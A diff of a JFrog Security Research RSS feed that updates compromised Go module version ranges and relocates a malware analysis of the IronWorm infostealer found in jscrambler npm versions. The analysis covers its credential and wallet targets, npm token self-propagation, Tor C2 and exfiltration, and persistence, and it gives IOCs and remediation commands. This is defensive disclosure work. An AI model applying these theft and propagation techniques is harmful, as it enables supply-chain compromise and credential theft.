@@ -4,7 +4,7 @@
         <title>JFrog Security Real Time Posts</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest security real-time threat posts from JFrog Security Research.</description>
-        <lastBuildDate>Thu, 06 Aug 2026 00:35:47 GMT</lastBuildDate>
+        <lastBuildDate>Thu, 06 Aug 2026 06:47:18 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -223,6 +223,8 @@ If an affected version ran in your environment, removing the package is not enou
 ## Compromised packages (Ongoing)
 
 The initial wave consisted of `keyv` `6.0.0`, `cacheable` `2.5.1`, and the `@cacheable/*` family. Because the worm republishes every package writable with the credentials it steals, the list below keeps growing. It is current as of this writing and will be updated. Xray IDs are being assigned and will be added.
+
+For some Go modules, Version uses `>= <first affected>` to mean that version and all later versions are compromised.
 
 | Package | Type | Version | Xray ID |
 | :---- | :---- | :---- | :---- |
@@ -692,11 +694,11 @@ The initial wave consisted of `keyv` `6.0.0`, `cacheable` `2.5.1`, and the `@cac
 | `github.com/jaredwray/keyv` | golang | `v6.0.1+incompatible`, `v6.0.2-0.20260804114834-c9627446c233+incompatible` | XRAY-1043650 |
 | `github.com/jaredwray/cacheable` | golang | `v0.0.0-20260804100608-893f73f5082d` | XRAY-1043647 |
 | `github.com/jaredwray/ecto` | golang | `v5.0.1+incompatible`, `v5.0.2-0.20260804102746-5687c7ba63eb+incompatible` | XRAY-1043649 |
-| `github.com/techtoboggan/claude-desktop-hardened-linux` | golang | `v0.0.0-20260804101346-1652b9de0c6a` | XRAY-1043648 |
-| `github.com/adieuu-llc/adieuu-2026` | golang | `v0.4.9`, `v0.4.10`, `v0.4.11`, `v0.0.0-20260805040439-27421527967b` | XRAY-1043643 |
-| `github.com/rainb0w-clwn/node-cache-manager-fs-binary-ts` | golang | `v0.0.0-20260804104622-4cb4a1e10ea7` | XRAY-1043644 |
-| `github.com/evilgodfahim/kal` | golang | `v0.0.0-20260805062327-23dc26d5459b` | XRAY-1043645 |
-| `github.com/juxtaposition1/v.a.p.e` | golang | `v0.0.0-20260805081246-648cd8543c4f`, `v0.0.0-20260805084238-a34d6435a226`, `v0.0.0-20260805085748-6b70acca383d`, `v0.0.0-20260805091749-3577fc492f9c`, `v0.0.0-20260805094244-a5ad050e5764`, `v0.0.0-20260805095815-e2821268cb56`, `v0.0.0-20260805102734-fa13efcb0021`, `v0.0.0-20260805103721-6c35385e306e`, `v0.0.0-20260805105744-2e3821fe0134`, `v0.0.0-20260805112245-3e6a394afda3`, `v0.0.0-20260805114232-76b7500ec99e`, `v0.0.0-20260805121229-0c330a3d16cd`, `v0.0.0-20260805122728-bfb00c75aa48`, `v0.0.0-20260805125426-65fa5b7ba144`, `v0.0.0-20260805125931-566d41742f4c`, `v0.0.0-20260805131702-56e7d684a7a6`, `v0.0.0-20260805135237-28a7c47d4017`, `v0.0.0-20260805135941-e95c44f99bb9`, `v0.0.0-20260805141432-e1b9b59e611a`, `v0.0.0-20260805143749-f2b2c421e37c`, `v0.0.0-20260805150258-2dd8de5f8b82` | XRAY-1043646 |
+| `github.com/techtoboggan/claude-desktop-hardened-linux` | golang | `>= v0.0.0-20260804101346-1652b9de0c6a` | XRAY-1043648 |
+| `github.com/adieuu-llc/adieuu-2026` | golang | `>= v0.4.9` | XRAY-1043643 |
+| `github.com/rainb0w-clwn/node-cache-manager-fs-binary-ts` | golang | `>= v0.0.0-20260804104622-4cb4a1e10ea7` | XRAY-1043644 |
+| `github.com/evilgodfahim/kal` | golang | `>= v0.0.0-20260805062327-23dc26d5459b` | XRAY-1043645 |
+| `github.com/juxtaposition1/v.a.p.e` | golang | `>= v0.0.0-20260805081246-648cd8543c4f` | XRAY-1043646 |
 
 ## Indicators of compromise (IOCs)
 
@@ -1596,6 +1598,235 @@ The Lucide Proxy campaign illustrates the risks of using third-party unblocking 
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[IronWorm Returns as jscrambler, Rustier Than Ever]]></title>
+            <link>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</link>
+            <guid>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</guid>
+            <pubDate>Sun, 12 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[Only a month after we exposed the IronWorm infostealer, an evolved variant has surfaced in compromised versions of the popular jscrambler npm package. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.]]></description>
+            <content:encoded><![CDATA[
+Only a month after we exposed the [IronWorm infostealer](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/), an evolved variant has surfaced in compromised versions of the popular `jscrambler` npm package, resembling similar behavior to Shai-Hulud; like the original version of IronWorm did. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.
+
+<div align="center">
+
+![](/img/RealTimePostImage/post/ironworm/returns.png)
+
+</div>
+
+The attack surfaced via the `jscrambler` package on npm, uploaded on July 11, 2026. Versions 8.14.0, 8.16.0, 8.17.0, 8.18.0, and 8.20.0 all contain `package/dist/intro.js`, which is the bundle that contains the malicious native payload loader.
+
+The implant is an evolved variant of IronWorm, preserving its unusual architecture while significantly expanding platform coverage, persistence mechanisms, and target lists. Here is the breakdown of what has changed and why this new variant shows the attackers are becoming much more sophisticated.
+
+## Shift in packaging: The custom CSI container
+
+The first campaign we analyzed used a Linux x86-64 executable packed with a lightly modified UPX stub. The new variant abandons UPX entirely for cross-platform delivery. Instead, the malicious script in `dist/intro.js` parses a custom container format starting with the magic bytes `1B 43 53 49 01 03 00` (CSI).
+
+This container holds three distinct native payloads:
+* A Linux x86-64 PIE ELF executable
+* A Windows x86-64 PE32+ executable
+* A macOS arm64 Mach-O executable
+
+When the installer runs, the JavaScript loader checks the host operating system using `process.platform`. It selects the corresponding slice of the CSI container, decompresses it via gzip, writes the binary to a hidden temporary path, and executes it as a detached background process.
+
+<div align="center">
+
+![CSI loader JavaScript](/img/RealTimePostImage/post/ironworm/decomp-1.png)
+
+</div>
+
+## Automated npm self-propagation
+
+While the previous variant contained logic for credential theft and potential commit forging, our analysis of the new Linux payload confirms an end-to-end, fully automated npm propagation routine.
+
+Unlike the first variant, which attempted to exchange OIDC identity tokens for Trusted Publishing, this variant goes back to basics but automates it completely. It performs the following steps without needing any local npm command line tools:
+
+1. **Collects npm credentials:** It scans environment variables and files on disk for `NPM_TOKEN`, `NODE_AUTH_TOKEN`, `NPM_CONFIG__AUTHTOKEN`, `NPM_CONFIG_TOKEN`, `NPM_AUTH_TOKEN`, `.npmrc`, `/etc/npmrc`, and `_authToken=`.
+2. **Validates credentials:** It queries `registry.npmjs.org/-/whoami` to verify the token, then lists organizations and packages using `/-/orgs` and `/-/v1/user/<user>/packages`.
+3. **Selects popular targets:** It queries `api.npmjs.org/downloads/point/last-month` to prioritize packages with higher download counts.
+4. **Downloads and infects:** It retrieves the latest `.tgz` archive of the target package, unpacks it, adds a malicious `setup.mjs` script, and rewrites `package.json` to trigger `node setup.mjs` via `scripts.preinstall`.
+5. **Direct registry publication:** Instead of executing `npm publish`, the native payload builds the necessary publication metadata JSON and uploads it directly to `registry.npmjs.org` using a raw HTTP `PUT` request on port 443 with the stolen bearer token.
+
+<div align="center">
+
+![npm registry PUT decompilation](/img/RealTimePostImage/post/ironworm/decomp-2.png)
+
+</div>
+
+## Expanded target set: VPNs, offensive tools, and password managers
+
+The original campaign swept for developer environment keys, cloud credentials, and cryptocurrency wallets (specifically Exodus). The new variant has heavily expanded its targets.
+
+### Active browser-extension wallet theft
+Instead of relying solely on modifying the local desktop Exodus application, the malware uses its unique per-site string encryption to target browser extensions. The encryption routine uses ChaCha20-Poly1305 with a distinct 32-byte key and 12-byte nonce for every single string call site. Decrypting these strings reveals targets such as MetaMask (`nkbihfbeogaeaoehlefnkodbefgpgknn`) and Trust Wallet (`egjidjbpglichdcondbcbdnbeeppgdph`).
+
+<div align="center">
+
+![Wallet target decryption](/img/RealTimePostImage/post/ironworm/decomp-3.png)
+
+</div>
+
+### VPN and network credentials
+The malware now searches for and exfiltrates WireGuard configuration files (`/etc/wireguard/*.conf`), OpenVPN configurations (`/etc/openvpn`), IPsec secrets (`/etc/ipsec.secrets`), strongSwan configurations, and PPP CHAP/PAP credentials.
+
+### Evolved Tor command and control (C2)
+While the previous variant utilized simple HTTP-based Tor communication, our analysis of the new Linux payload reveals a significantly more sophisticated Tor transport and exfiltration mechanism.
+
+#### Local Tor Expert Bundle management
+When launched, the malware dynamically acquires and manages its own Tor network path rather than relying on a pre-installed client:
+1. It probes localhost to find an open SOCKS port.
+2. If none is available, it connects directly to `archive.torproject.org:443` to download the official Tor Expert Bundle archive (`tor-expert-bundle-<platform>-16.0a7.tar.gz`), extracting the binary and its dependent libraries (`libcrypto.so.3`, `libssl.so.3`, and `libevent`).
+3. It generates a local `.torrc` configuration setting `RunAsDaemon 0`. It launches Tor as a foreground child process, monitoring its standard error until it reads the `Bootstrapped 100%` success signal.
+
+#### Direct SOCKS5 CONNECT negotiation
+To route traffic, the native payload negotiates SOCKS5 handshake requests directly at the socket level. It connects to the local Tor SOCKS proxy and performs authentication negotiation (`05 01 00` requiring a `05 00` no-authentication response) followed by a domain CONNECT request. This instructs Tor to perform the destination DNS resolution directly, concealing the lookup from the host system.
+
+#### Multi-route C2 transport
+The malware supports two distinct Tor-carried communication routes:
+* **HTTP Bootstrap (Route 1):** SOCKS connects to the destination C2 hostname on port 80, followed by a `POST / HTTP/1.0` request containing the 32-byte client public key. Unlike the original IronWorm's `/api/agent` path, this HTTP wrapper has been simplified to use the root `/` path.
+* **Raw Stream (Route 2):** Alternatively, the malware negotiates SOCKS to the destination on port 8080, bypassing HTTP headers entirely to communicate over a raw, structured TCP channel.
+
+#### Layered stream cryptography (X25519 & ChaCha20-Poly1305)
+The communication channel uses layered, application-level encryption inside the Tor stream:
+
+1. **X25519 Public Key Exchange:** The client generates 32 random bytes, clamps them as an X25519 private scalar, and derives its public key. It sends this public key during the bootstrap phase. It decrypts an embedded server public key (`x25519_server_pub`) stored securely in its configuration, so no server public key needs to be exchanged over the wire.
+2. **Directional HKDF Expansion:** The resulting shared secret is expanded into separate client-to-server (`csi-a2s`, `hkdf a2s`) and server-to-client (`csi-s2a`, `hkdf s2a`) key spaces, preventing key reuse.
+3. **ChaCha20-Poly1305 Framing:** Every message is framed with a 4-byte big-endian length, a 12-byte nonce, and a ChaCha20-Poly1305 authenticated ciphertext payload.
+
+Once the encrypted handshaking loop completes, the malware sends an encrypted `hello` JSON payload detailing CPU cores, system locale, active users, and environment info, then enters a loop supporting remote liveness pings, command execution (via `bash`, `python3`, powershell, and `cmd`), and remote command cancellation.
+
+<div align="center">
+
+![SOCKS5 CONNECT and key exchange](/img/RealTimePostImage/post/ironworm/decomp-4.png)
+
+</div>
+
+#### The dual-path exfiltration blunder
+The malware's exfiltration strategy uses a dual-path architecture that is as clever as it is self-defeating. 
+
+For control, commands, and metadata, the implant sticks to the encrypted Tor SOCKS5 channel. The initial system fingerprint, sent as an encrypted `t=hello` packet, contains everything from the hardware ID and active user to the CPU core count, system locale, and local SOCKS port.
+
+But when it comes to bulk exfiltration, the malware authors made a massive opsec blunder. 
+
+Instead of routing large file uploads, source trees, or harvested credential databases through the slow Tor network, the malware bypasses the proxy entirely. It uses the `rustls` library to open a direct, unproxied HTTPS connection to `temp.sh`, a public file-sharing service. It uploads the stolen data using a standard multipart/form-data `POST` request. Once the upload finishes, the malware parses the response for the resulting `https://` URL and transmits that link back to the operator over the Tor C2 stream.
+
+This design has two major implications:
+* **Real IP exposure:** The query to `check.torproject.org/api/ip` to obtain the victim's public IP (which is included in the encrypted `hello` packet) is made directly over TLS, leaking the victim's real, unproxied IP address to the Tor Project's infrastructure before C2 communication even starts.
+* **Network visibility:** Any network monitor or firewall will see the bulk data transfer going straight to a public file host over direct TLS, completely defeating the anonymity of using Tor for the command channel.
+
+Staging stolen data on a public file host also means the operator does not have to host or scale their own storage infrastructure. However, it also means the victim's sensitive secrets are left on a third-party service where they might be exposed if the generated URLs are guessed or the host's logs are audited.
+
+### Tor hidden-service keys
+Separately from launching its own Tor client for C2 communication, the malware now scans the host for Tor configuration files and actively steals private keys associated with third-party onion services. This includes files such as `hs_ed25519_secret_key`, `hs_ed25519_public_key`, and `private_key_ed25519`.
+
+### Offensive-security infrastructure
+In a highly targeted move, the implant searches for local installations and configuration folders of popular red-team and C2 frameworks, including Metasploit, Sliver, Havoc, Mythic, Covenant, AdaptixC2, and Shad0w. This suggests the threat actors are intentionally targeting the workstations of security researchers, penetration testers, and operators.
+
+### Password managers and local key-stores
+The credential scanner now collects local vaults for 1Password and Bitwarden. On Linux systems, it actively queries the KDE Wallet service over D-Bus (`org.kde.KWallet`) and executes `kwallet-query --read-password` to extract passwords directly from the system keyring.
+
+## Broad cross-platform persistence
+
+The previous variant only used basic systemd user services to maintain persistence on Linux systems. The new codebase contains a dedicated, cross-platform persistence engine that deploys different mechanisms depending on the host:
+
+* **Linux:** It attempts to install a systemd system service under `/etc/systemd/system` with `Restart=always`, reloading the daemon and starting it immediately. If that fails, it falls back to a user-level systemd unit under `~/.config/systemd/user` or traditional cron jobs (`/etc/cron.d` or user crontab).
+* **macOS:** It deploys LaunchAgents and LaunchDaemons plist files to ensure execution across user sessions and system boots.
+* **Windows:** It writes its payload directly into the user's Startup folder (`AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`).
+
+## Remediation guidance
+
+If your environment has installed any of the compromised `jscrambler` versions, you must assume your system is compromised and all local credentials are compromised.
+
+### Step 1: Containment
+Cut off the malware's ability to propagate or exfiltrate:
+* **Revoke and rotate ALL secrets and credentials** that were present on the infected host. This includes AWS, Kubernetes, Docker, database, and SSH keys.
+* **Revoke all npm tokens** immediately. Check your npm account's publishing history for unauthorized package versions.
+* Block outgoing connections to the observed C2 IP addresses (`37.27.122.124` and `57.128.246.79`) and Tor onion-routing nodes.
+
+### Step 2: Eradication of persistence
+Depending on your platform, locate and remove the persistence hooks.
+
+On Linux:
+```shell
+# Check and stop systemd services
+systemctl stop malicious-service-name.service
+systemctl disable malicious-service-name.service
+rm -f /etc/systemd/system/malicious-service-name.service
+systemctl daemon-reload
+
+# Check user-level systemd services
+systemctl --user stop pgmon.service
+systemctl --user disable pgmon.service
+rm -f ~/.config/systemd/user/pgmon.service
+systemctl --user daemon-reload
+
+# Check cron jobs
+crontab -r
+rm -f /etc/cron.d/malicious-job
+```
+
+On macOS:
+Identify and delete any unrecognized plist files under:
+* `~/Library/LaunchAgents/`
+* `/Library/LaunchAgents/`
+* `/Library/LaunchDaemons/`
+
+On Windows:
+Check the startup folder and delete any unrecognized executable or shortcut:
+* `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
+
+### Step 3: Package cleanup and dependency locking
+Purge the compromised `jscrambler` versions from your projects:
+```shell
+# Remove node_modules and clean npm cache
+rm -rf node_modules
+npm cache clean --force
+
+# Force downgrade or update to a clean version (8.21.0 or newer)
+# Avoid the infected range: 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0
+npm install jscrambler@latest
+```
+
+## Known malicious packages
+
+Through our continuous monitoring and threat intelligence pipeline, we have identified the following compromised package versions containing the IronWorm Rust implant:
+
+| Package Name | Malicious Versions | Xray ID |
+| :---- | :---- | :---- |
+| `jscrambler` | 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0 | XRAY-1025905 |
+
+## Conclusions
+
+The evolution of IronWorm into a highly automated, cross-platform threat shows how rapidly modern software supply chain actors are maturing. Transitioning from a single Linux target with standard UPX to a custom three-platform CSI container demonstrates both capability and intent to strike developers regardless of their local operating system.
+
+The automation of the npm propagation pipeline (by writing infected tarballs and uploading them using direct raw HTTP PUT requests) bypasses standard local CLI guardrails and accelerates the infection cycle. Security teams must monitor not just package configuration files, but active network activity originating from local install scripts and build machines.
+
+JFrog Curation customers are protected, as the malicious package versions have been blocked. We will continue monitoring the campaign and updating our intelligence feeds as new variants emerge.
+
+## Indicators of Compromise (IOCs)
+
+### Payloads
+
+| SHA-256 | Description |
+| :---- | :---- |
+| `a41a523ef9517aab37ed6eea0ec881821bdcb7aefcb5c5f603adc7907f868c86` | Malicious `index.js` file (the `jscrambler` CSI container) |
+| `fbbcf4d8f98168f78f5c0c47a9ae56d59ec8ac84a7c9ca6b797fedfb8d62d2bd` | Linux x86-64 payload |
+| `b7ca95d1b23c8e67416a25cedf741de0917c2096bbc9d24649eea7853d054903` | Windows x86-64 payload |
+| `c8fd47d36bdf7c825378593ab82ed8c24d1dc52e26b507812393e24e1d5201fd` | macOS arm64 payload |
+
+### Network indicators
+
+* `37.27.122.124` (C2 / upload destination)
+* `57.128.246.79` (C2 / upload destination)
+* `archive.torproject.org` (Tor bundle checks)
+* `check.torproject.org` (Tor loop verification)
+
+### Package indicators
+
+* `package/dist/intro.js`
+* `package/dist/setup.js`
+* `setup.mjs`
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry]]></title>
             <link>https://research.jfrog.com/post/injective-sdk-supply-chain-attack/</link>
             <guid>https://research.jfrog.com/post/injective-sdk-supply-chain-attack/</guid>
@@ -1833,235 +2064,6 @@ MsgBroadcasterWithPk constructed with raw privateKey followed by outbound POST
 EthSecp256k1Wallet.fromKey() or DirectEthSecp256k1Wallet.fromKey() followed by outbound POST
 Empty-body POST with high-entropy X-Request-Id header and Content-Type application/grpc-web+proto
 ```
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[IronWorm Returns as jscrambler, Rustier Than Ever]]></title>
-            <link>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</link>
-            <guid>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</guid>
-            <pubDate>Sun, 12 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[Only a month after we exposed the IronWorm infostealer, an evolved variant has surfaced in compromised versions of the popular jscrambler npm package. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.]]></description>
-            <content:encoded><![CDATA[
-Only a month after we exposed the [IronWorm infostealer](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/), an evolved variant has surfaced in compromised versions of the popular `jscrambler` npm package, resembling similar behavior to Shai-Hulud; like the original version of IronWorm did. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.
-
-<div align="center">
-
-![](/img/RealTimePostImage/post/ironworm/returns.png)
-
-</div>
-
-The attack surfaced via the `jscrambler` package on npm, uploaded on July 11, 2026. Versions 8.14.0, 8.16.0, 8.17.0, 8.18.0, and 8.20.0 all contain `package/dist/intro.js`, which is the bundle that contains the malicious native payload loader.
-
-The implant is an evolved variant of IronWorm, preserving its unusual architecture while significantly expanding platform coverage, persistence mechanisms, and target lists. Here is the breakdown of what has changed and why this new variant shows the attackers are becoming much more sophisticated.
-
-## Shift in packaging: The custom CSI container
-
-The first campaign we analyzed used a Linux x86-64 executable packed with a lightly modified UPX stub. The new variant abandons UPX entirely for cross-platform delivery. Instead, the malicious script in `dist/intro.js` parses a custom container format starting with the magic bytes `1B 43 53 49 01 03 00` (CSI).
-
-This container holds three distinct native payloads:
-* A Linux x86-64 PIE ELF executable
-* A Windows x86-64 PE32+ executable
-* A macOS arm64 Mach-O executable
-
-When the installer runs, the JavaScript loader checks the host operating system using `process.platform`. It selects the corresponding slice of the CSI container, decompresses it via gzip, writes the binary to a hidden temporary path, and executes it as a detached background process.
-
-<div align="center">
-
-![CSI loader JavaScript](/img/RealTimePostImage/post/ironworm/decomp-1.png)
-
-</div>
-
-## Automated npm self-propagation
-
-While the previous variant contained logic for credential theft and potential commit forging, our analysis of the new Linux payload confirms an end-to-end, fully automated npm propagation routine.
-
-Unlike the first variant, which attempted to exchange OIDC identity tokens for Trusted Publishing, this variant goes back to basics but automates it completely. It performs the following steps without needing any local npm command line tools:
-
-1. **Collects npm credentials:** It scans environment variables and files on disk for `NPM_TOKEN`, `NODE_AUTH_TOKEN`, `NPM_CONFIG__AUTHTOKEN`, `NPM_CONFIG_TOKEN`, `NPM_AUTH_TOKEN`, `.npmrc`, `/etc/npmrc`, and `_authToken=`.
-2. **Validates credentials:** It queries `registry.npmjs.org/-/whoami` to verify the token, then lists organizations and packages using `/-/orgs` and `/-/v1/user/<user>/packages`.
-3. **Selects popular targets:** It queries `api.npmjs.org/downloads/point/last-month` to prioritize packages with higher download counts.
-4. **Downloads and infects:** It retrieves the latest `.tgz` archive of the target package, unpacks it, adds a malicious `setup.mjs` script, and rewrites `package.json` to trigger `node setup.mjs` via `scripts.preinstall`.
-5. **Direct registry publication:** Instead of executing `npm publish`, the native payload builds the necessary publication metadata JSON and uploads it directly to `registry.npmjs.org` using a raw HTTP `PUT` request on port 443 with the stolen bearer token.
-
-<div align="center">
-
-![npm registry PUT decompilation](/img/RealTimePostImage/post/ironworm/decomp-2.png)
-
-</div>
-
-## Expanded target set: VPNs, offensive tools, and password managers
-
-The original campaign swept for developer environment keys, cloud credentials, and cryptocurrency wallets (specifically Exodus). The new variant has heavily expanded its targets.
-
-### Active browser-extension wallet theft
-Instead of relying solely on modifying the local desktop Exodus application, the malware uses its unique per-site string encryption to target browser extensions. The encryption routine uses ChaCha20-Poly1305 with a distinct 32-byte key and 12-byte nonce for every single string call site. Decrypting these strings reveals targets such as MetaMask (`nkbihfbeogaeaoehlefnkodbefgpgknn`) and Trust Wallet (`egjidjbpglichdcondbcbdnbeeppgdph`).
-
-<div align="center">
-
-![Wallet target decryption](/img/RealTimePostImage/post/ironworm/decomp-3.png)
-
-</div>
-
-### VPN and network credentials
-The malware now searches for and exfiltrates WireGuard configuration files (`/etc/wireguard/*.conf`), OpenVPN configurations (`/etc/openvpn`), IPsec secrets (`/etc/ipsec.secrets`), strongSwan configurations, and PPP CHAP/PAP credentials.
-
-### Evolved Tor command and control (C2)
-While the previous variant utilized simple HTTP-based Tor communication, our analysis of the new Linux payload reveals a significantly more sophisticated Tor transport and exfiltration mechanism.
-
-#### Local Tor Expert Bundle management
-When launched, the malware dynamically acquires and manages its own Tor network path rather than relying on a pre-installed client:
-1. It probes localhost to find an open SOCKS port.
-2. If none is available, it connects directly to `archive.torproject.org:443` to download the official Tor Expert Bundle archive (`tor-expert-bundle-<platform>-16.0a7.tar.gz`), extracting the binary and its dependent libraries (`libcrypto.so.3`, `libssl.so.3`, and `libevent`).
-3. It generates a local `.torrc` configuration setting `RunAsDaemon 0`. It launches Tor as a foreground child process, monitoring its standard error until it reads the `Bootstrapped 100%` success signal.
-
-#### Direct SOCKS5 CONNECT negotiation
-To route traffic, the native payload negotiates SOCKS5 handshake requests directly at the socket level. It connects to the local Tor SOCKS proxy and performs authentication negotiation (`05 01 00` requiring a `05 00` no-authentication response) followed by a domain CONNECT request. This instructs Tor to perform the destination DNS resolution directly, concealing the lookup from the host system.
-
-#### Multi-route C2 transport
-The malware supports two distinct Tor-carried communication routes:
-* **HTTP Bootstrap (Route 1):** SOCKS connects to the destination C2 hostname on port 80, followed by a `POST / HTTP/1.0` request containing the 32-byte client public key. Unlike the original IronWorm's `/api/agent` path, this HTTP wrapper has been simplified to use the root `/` path.
-* **Raw Stream (Route 2):** Alternatively, the malware negotiates SOCKS to the destination on port 8080, bypassing HTTP headers entirely to communicate over a raw, structured TCP channel.
-
-#### Layered stream cryptography (X25519 & ChaCha20-Poly1305)
-The communication channel uses layered, application-level encryption inside the Tor stream:
-
-1. **X25519 Public Key Exchange:** The client generates 32 random bytes, clamps them as an X25519 private scalar, and derives its public key. It sends this public key during the bootstrap phase. It decrypts an embedded server public key (`x25519_server_pub`) stored securely in its configuration, so no server public key needs to be exchanged over the wire.
-2. **Directional HKDF Expansion:** The resulting shared secret is expanded into separate client-to-server (`csi-a2s`, `hkdf a2s`) and server-to-client (`csi-s2a`, `hkdf s2a`) key spaces, preventing key reuse.
-3. **ChaCha20-Poly1305 Framing:** Every message is framed with a 4-byte big-endian length, a 12-byte nonce, and a ChaCha20-Poly1305 authenticated ciphertext payload.
-
-Once the encrypted handshaking loop completes, the malware sends an encrypted `hello` JSON payload detailing CPU cores, system locale, active users, and environment info, then enters a loop supporting remote liveness pings, command execution (via `bash`, `python3`, powershell, and `cmd`), and remote command cancellation.
-
-<div align="center">
-
-![SOCKS5 CONNECT and key exchange](/img/RealTimePostImage/post/ironworm/decomp-4.png)
-
-</div>
-
-#### The dual-path exfiltration blunder
-The malware's exfiltration strategy uses a dual-path architecture that is as clever as it is self-defeating. 
-
-For control, commands, and metadata, the implant sticks to the encrypted Tor SOCKS5 channel. The initial system fingerprint, sent as an encrypted `t=hello` packet, contains everything from the hardware ID and active user to the CPU core count, system locale, and local SOCKS port.
-
-But when it comes to bulk exfiltration, the malware authors made a massive opsec blunder. 
-
-Instead of routing large file uploads, source trees, or harvested credential databases through the slow Tor network, the malware bypasses the proxy entirely. It uses the `rustls` library to open a direct, unproxied HTTPS connection to `temp.sh`, a public file-sharing service. It uploads the stolen data using a standard multipart/form-data `POST` request. Once the upload finishes, the malware parses the response for the resulting `https://` URL and transmits that link back to the operator over the Tor C2 stream.
-
-This design has two major implications:
-* **Real IP exposure:** The query to `check.torproject.org/api/ip` to obtain the victim's public IP (which is included in the encrypted `hello` packet) is made directly over TLS, leaking the victim's real, unproxied IP address to the Tor Project's infrastructure before C2 communication even starts.
-* **Network visibility:** Any network monitor or firewall will see the bulk data transfer going straight to a public file host over direct TLS, completely defeating the anonymity of using Tor for the command channel.
-
-Staging stolen data on a public file host also means the operator does not have to host or scale their own storage infrastructure. However, it also means the victim's sensitive secrets are left on a third-party service where they might be exposed if the generated URLs are guessed or the host's logs are audited.
-
-### Tor hidden-service keys
-Separately from launching its own Tor client for C2 communication, the malware now scans the host for Tor configuration files and actively steals private keys associated with third-party onion services. This includes files such as `hs_ed25519_secret_key`, `hs_ed25519_public_key`, and `private_key_ed25519`.
-
-### Offensive-security infrastructure
-In a highly targeted move, the implant searches for local installations and configuration folders of popular red-team and C2 frameworks, including Metasploit, Sliver, Havoc, Mythic, Covenant, AdaptixC2, and Shad0w. This suggests the threat actors are intentionally targeting the workstations of security researchers, penetration testers, and operators.
-
-### Password managers and local key-stores
-The credential scanner now collects local vaults for 1Password and Bitwarden. On Linux systems, it actively queries the KDE Wallet service over D-Bus (`org.kde.KWallet`) and executes `kwallet-query --read-password` to extract passwords directly from the system keyring.
-
-## Broad cross-platform persistence
-
-The previous variant only used basic systemd user services to maintain persistence on Linux systems. The new codebase contains a dedicated, cross-platform persistence engine that deploys different mechanisms depending on the host:
-
-* **Linux:** It attempts to install a systemd system service under `/etc/systemd/system` with `Restart=always`, reloading the daemon and starting it immediately. If that fails, it falls back to a user-level systemd unit under `~/.config/systemd/user` or traditional cron jobs (`/etc/cron.d` or user crontab).
-* **macOS:** It deploys LaunchAgents and LaunchDaemons plist files to ensure execution across user sessions and system boots.
-* **Windows:** It writes its payload directly into the user's Startup folder (`AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`).
-
-## Remediation guidance
-
-If your environment has installed any of the compromised `jscrambler` versions, you must assume your system is compromised and all local credentials are compromised.
-
-### Step 1: Containment
-Cut off the malware's ability to propagate or exfiltrate:
-* **Revoke and rotate ALL secrets and credentials** that were present on the infected host. This includes AWS, Kubernetes, Docker, database, and SSH keys.
-* **Revoke all npm tokens** immediately. Check your npm account's publishing history for unauthorized package versions.
-* Block outgoing connections to the observed C2 IP addresses (`37.27.122.124` and `57.128.246.79`) and Tor onion-routing nodes.
-
-### Step 2: Eradication of persistence
-Depending on your platform, locate and remove the persistence hooks.
-
-On Linux:
-```shell
-# Check and stop systemd services
-systemctl stop malicious-service-name.service
-systemctl disable malicious-service-name.service
-rm -f /etc/systemd/system/malicious-service-name.service
-systemctl daemon-reload
-
-# Check user-level systemd services
-systemctl --user stop pgmon.service
-systemctl --user disable pgmon.service
-rm -f ~/.config/systemd/user/pgmon.service
-systemctl --user daemon-reload
-
-# Check cron jobs
-crontab -r
-rm -f /etc/cron.d/malicious-job
-```
-
-On macOS:
-Identify and delete any unrecognized plist files under:
-* `~/Library/LaunchAgents/`
-* `/Library/LaunchAgents/`
-* `/Library/LaunchDaemons/`
-
-On Windows:
-Check the startup folder and delete any unrecognized executable or shortcut:
-* `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
-
-### Step 3: Package cleanup and dependency locking
-Purge the compromised `jscrambler` versions from your projects:
-```shell
-# Remove node_modules and clean npm cache
-rm -rf node_modules
-npm cache clean --force
-
-# Force downgrade or update to a clean version (8.21.0 or newer)
-# Avoid the infected range: 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0
-npm install jscrambler@latest
-```
-
-## Known malicious packages
-
-Through our continuous monitoring and threat intelligence pipeline, we have identified the following compromised package versions containing the IronWorm Rust implant:
-
-| Package Name | Malicious Versions | Xray ID |
-| :---- | :---- | :---- |
-| `jscrambler` | 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0 | XRAY-1025905 |
-
-## Conclusions
-
-The evolution of IronWorm into a highly automated, cross-platform threat shows how rapidly modern software supply chain actors are maturing. Transitioning from a single Linux target with standard UPX to a custom three-platform CSI container demonstrates both capability and intent to strike developers regardless of their local operating system.
-
